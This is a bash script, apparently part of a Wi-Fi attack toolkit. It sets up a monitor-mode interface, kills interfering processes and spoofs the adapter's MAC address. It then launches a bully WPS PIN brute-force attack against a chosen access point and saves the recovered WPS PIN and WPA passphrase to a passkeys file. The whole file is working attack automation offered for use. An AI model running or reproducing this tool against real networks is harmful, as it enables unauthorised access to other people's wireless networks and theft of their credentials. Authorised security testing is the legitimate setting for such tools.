#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

monX_Detection(){

Monitor_Mode_Interface_Check1=$(airmon-ng | grep "mon" | nl -ba -w 1  -s ': ')
if grep -q "2" <<< "$Monitor_Mode_Interface_Check1" ; then

   while true
   do

   clear
   Multiple_monX_Available=$(airmon-ng | grep "mon" | column -t | nl -ba -w 1  -s ': ' | sed -e "\$a0: Create A New Monitor Mode Interface")
   clear
   echo $RED"Multiple monitor mode interface's were detected."$STAND
   echo
   echo "$Multiple_monX_Available"
   echo ""
   read -p $GREEN"Please choose an option:$STAND " grep_Line_Number

   case $grep_Line_Number in
   1|2|3|4|5|6|7|8|9|1*|2*|3*|4*|5*|6*|7*|8*|9*|0)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   if [[ $grep_Line_Number == "0" ]]; then
      clear
      Create_Monitor_Mode_Interface
   fi
else
   clear
   Monitor_Mode_Interface_Check2=$(airmon-ng | grep "mon")
   if [[ $Monitor_Mode_Interface_Check2 ]]; then

      while true
      do

      clear
      One_monX_Available=$(airmon-ng | grep "mon" | column -t | nl -ba -w 1  -s ': ' | sed -e "\$a0: Create A New Monitor Mode Interface")
      clear
      echo $RED"1 monitor mode interface was detected."$STAND
      echo
      echo "$One_monX_Available"
      echo ""
      read -p $GREEN"Please choose an option:$STAND " grep_Line_Number

      case $grep_Line_Number in
      1|2|3|4|5|6|7|8|9|1*|2*|3*|4*|5*|6*|7*|8*|9*|0)
      break ;;
      *) echo "Input was incorrect, please re-choose an option." ;;
      esac
      done

      if [[ $grep_Line_Number == "0" ]]; then
         clear
         Create_Monitor_Mode_Interface
      fi
   else
      clear
      echo $RED"0 monitor mode interface's were detected."$STAND
      sleep 3
      Create_Monitor_Mode_Interface
   fi
fi

monX=$(airmon-ng | grep "mon" | sed -n ""$grep_Line_Number"p" | awk '{ print $1 }')
clear
echo $RED"Chosen monitor interface:$STAND $monX"
sleep 3

Find_wlanX=$(airmon-ng | grep "$monX" | rev | awk '{ print $1 }' | rev | sed -e 's/\[//g' -e 's/\]//g')
wlanX=$(airmon-ng | grep "$Find_wlanX" | grep "wlan" | awk '{ print $1 }')

if [ "$(pidof NetworkManager)" ] 
then
   echo "Network Manager is running."
   Connection_Check=$(nmcli dev status | grep "$wlanX" | grep "disconnected")
   if [[ $Connection_Check ]]; then
      echo ""
      echo "$wlanX was already disconnected."
      sleep 3
   else
      echo ""
      echo $RED"Disconnecting $STAND"$wlanX"..."
      nmcli dev disconnect iface $wlanX
      sleep 3
      echo ""
   fi
else
   echo ""
   echo "Network Manager isn't running, skipping connection check."
   sleep 3
fi

Airmon_Check=$(airmon-ng check | sed '1,7d')
if [[ $Airmon_Check ]]; then
   while true
   do

   clear
   echo $RED"Possible conflicting processes were detected"$STAND
   echo "$Airmon_Check"
   echo ""
   echo $GREEN"[1]$BLUE = Airmon-ng Check Kill (Auto Kill Processes) ."$STAND
   echo $GREEN"[2]$BLUE = Launch System Monitor (Manually Select & Kill Processes)."$STAND
   echo $GREEN"[3]$BLUE = Continue Without Killing Processes."$STAND
   read -p $GREEN"Please choose an option?:$STAND " Kill_Processes_Options

   case $Kill_Processes_Options in
   1|2|3)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   if [[ $Kill_Processes_Options == "1" ]]; then
      clear
      airmon-ng check kill
   fi

   if [[ $Kill_Processes_Options == "2" ]]; then
      clear
      gnome-system-monitor
      read -p $GREEN"When you have finished killing processes press [Enter] to continue.$STAND"
   fi

   if [[ $Kill_Processes_Options == "3" ]]; then
      clear
      echo $RED"Proceeding without killing any processes"$STAND
      sleep 3
   fi
else
   echo ""
fi

Details
}

Create_Monitor_Mode_Interface(){

clear
WiFi_Adapters_Check=$(airmon-ng | grep "wlan" | nl -ba -w 1  -s ': ')
if grep -q "2" <<< "$WiFi_Adapters_Check" ; then
   Multiple_WiFi_Adapters_Available=$(airmon-ng | grep "wlan" | column -t | nl -ba -w 1  -s ': ')
   clear
   echo $RED"Multiple WiFi adapters were detected."$STAND
   echo
   echo "$Multiple_WiFi_Adapters_Available"
   echo ""
   read -p $GREEN"Please choose a WiFi adapter to use for scanning:$STAND " grep_Line_Number
   wlanX=$(airmon-ng | grep "wlan" | column -t | nl -ba -w 1  -s ': ' | sed -n ""$grep_Line_Number"p" | awk '{ print $2 }')
else
   wlanX=$(airmon-ng | grep "wlan" | awk '{ print $1 }')
fi

if [ "$(pidof NetworkManager)" ] 
then
   echo "Network Manager is running."
   Connection_Check=$(nmcli dev status | grep "$wlanX" | grep "disconnected")
   if [[ $Connection_Check ]]; then
      echo ""
      echo "$wlanX was already disconnected."
      sleep 3
   else
      echo ""
      echo $RED"Disconnecting $STAND"$wlanX"..."
      nmcli dev disconnect iface $wlanX
      sleep 3
      echo ""
   fi
else
   echo ""
   echo "Network Manager isn't running, skipping connection check."
   sleep 3
fi

Airmon_Check=$(airmon-ng check | sed '1,7d')
if [[ $Airmon_Check ]]; then
   while true
   do

   clear
   echo $RED"Possible conflicting processes were detected"$STAND
   echo "$Airmon_Check"
   echo ""
   echo $GREEN"[1]$BLUE = Airmon-ng Check Kill (Auto Kill Processes) ."$STAND
   echo $GREEN"[2]$BLUE = Launch System Monitor (Manually Select & Kill Processes)."$STAND
   echo $GREEN"[3]$BLUE = Continue Without Killing Processes."$STAND
   read -p $GREEN"Please choose an option?:$STAND " Kill_Processes_Options

   case $Kill_Processes_Options in
   1|2|3)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   if [[ $Kill_Processes_Options == "1" ]]; then
      clear
      airmon-ng check kill
   fi

   if [[ $Kill_Processes_Options == "2" ]]; then
      clear
      gnome-system-monitor
      read -p $GREEN"When you have finished killing processes press [Enter] to continue.$STAND"
   fi

   if [[ $Kill_Processes_Options == "3" ]]; then
      clear
      echo $RED"Proceeding without killing any processes"$STAND
      sleep 3
   fi
else
   echo ""
fi

clear
echo $RED"Enabling monitor mode for $STAND"$wlanX"..."$STAND
sleep 3

monX=$(airmon-ng start $wlanX | grep "monitor mode enabled on" | sed -e 's/(//g' -e 's/)//g' | awk '{ print $5 }')

Details
}

Details(){

FolderName=$(cat /usr/share/FS3/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $2 }' | sed -e 's/://g')

rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName &> /dev/null

mkdir /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName
cp /usr/share/FS3/Temp_Working_Dirctory/Chosen_AP_Line.txt /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName

AP_Name=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_essid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Chosen_AP_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g')
AP_bssid=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Chosen_AP_Line.txt | awk '{ print $2 }')
AP_channel=$(cat /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Chosen_AP_Line.txt | awk '{ print $5 }' | sed 's/Channel-//g')

Bully_Bruteforce_Settings
}

Bully_Bruteforce_Settings(){

clear
while true
do

clear
echo $RED"$wlanX:"$STAND
macchanger -s $wlanX
echo $RED"$monX:"$STAND
macchanger -s $monX

echo $RED"Note:"$STAND
echo $RED"Changing the mac address while performing multiple attacks might cause issue's."$STAND
echo ""
echo $GREEN"[1]$BLUE = Set A Random MAC Address.$STAND"
echo $GREEN"[2]$BLUE = Set A Custom MAC Address.$STAND"
echo $GREEN"[3]$BLUE = Continue Without Changing The MAC Address.$STAND"
read -p $GREEN"Please choose an option$STAND: " MACoption

case $MACoption in
1|2|3)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $MACoption == "1" ]]; then
   clear
   echo $RED"Setting A Random MAC Address.$STAND"
   echo $RED"Please Wait..."$STAND
   ifconfig $wlanX down
   ifconfig $monX down
   wlanXmac=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   echo ""
   macchanger --mac $wlanXmac $monX
   ifconfig $wlanX up
   ifconfig $monX up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND $monX:"
   macchanger -s $monX
   sleep 2
fi

if [[ $MACoption == "2" ]]; then

   while true
   do

   clear
   echo $RED"Set A User specified MAC Address.$STAND"
   echo $RED"Please Wait..."$STAND
   ifconfig $wlanX down
   ifconfig $monX down
   echo ""
   echo $RED"Setting a random MAC address."$STAND
   macchanger -r $wlanX
   echo ""
   echo $RED"NOTE: Pressing the [Enter] button will generate a random mac address."$STAND
   read -p $GREEN"Input any mac address you want to use?.$STAND " SpecifiedInterfaceMAC

   case $SpecifiedInterfaceMAC in
   **:**:**:**:**:**)
   break ;;
   *) echo "Input was incorrect, please re-choose an option." ;;
   esac
   done

   macchanger --mac $SpecifiedInterfaceMAC $wlanX
   macchanger --mac $SpecifiedInterfaceMAC $monX
   ifconfig $wlanX up
   ifconfig $monX up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"$STAND
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND $monX:"$STAND
   macchanger -s $monX
   sleep 2
fi

if [[ $MACoption == "3" ]]; then
   clear
fi

clear
echo $RED"Bully Bruteforce Attack Command:"$STAND
echo "bully $monX -c $AP_channel -b $AP_bssid -F -l 60 -v 3"
echo ""
read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
clear

xterm -geometry 100x12+675+500 -l -lf /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt -e "bully $monX -c $AP_channel -b $AP_bssid -F -l 60 -v 3"

cat /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt | tail -20

if [[ -f /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt ]]; then
   Recovered_Passkey_Check=$(grep "KEY : '" /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt)
   if [[ $Recovered_Passkey_Check ]]; then

      echo ""
      echo $RED"Recovered passkey & WPS pin will be coppied to:"
      echo $STAND"/usr/share/FS3/Passkeys/"$AP_Name".txt"
      echo ""
      read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND

      echo 'ESSID: '$AP_essid'' > /usr/share/FS3/Passkeys/"$AP_Name".txt

      echo 'BSSID: '$AP_bssid'' >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      tail -4 /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt | sed -e 's/^[ \t]*//;s/[ \t]*$//' | sed s/\'//g | sed -e 's/PIN : /WPS PIN: /g' -e 's/KEY : /WPA PSK: /g' | grep "WPS PIN:" >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      tail -4 /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt | sed -e 's/^[ \t]*//;s/[ \t]*$//' | sed s/\'//g | sed -e 's/PIN : /WPS PIN: /g' -e 's/KEY : /WPA PSK: /g' | grep "WPA PSK:" >> /usr/share/FS3/Passkeys/"$AP_Name".txt

      rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName
      exit
   fi
fi

echo ""
echo "Bully was cancelled or it failed."
sleep 5

while true
do

clear
echo $GREEN"[1]$BLUE = Retry attack."$STAND
echo $GREEN"[q]$BLUE = Exit attack."$STAND
read -p $GREEN"Please choose an option?:$STAND " Options

case $Options in
1|q)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $Options == "1" ]]; then
   rm /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName/Bully.txt &> /dev/null
   Bully_Bruteforce_Settings
fi

if [[ $Options == "q" ]]; then
   clear
   rm -r /usr/share/FS3/Temp_Working_Dirctory/Bully_Bruteforce_$FolderName
   exit
fi
}

monX_Detection
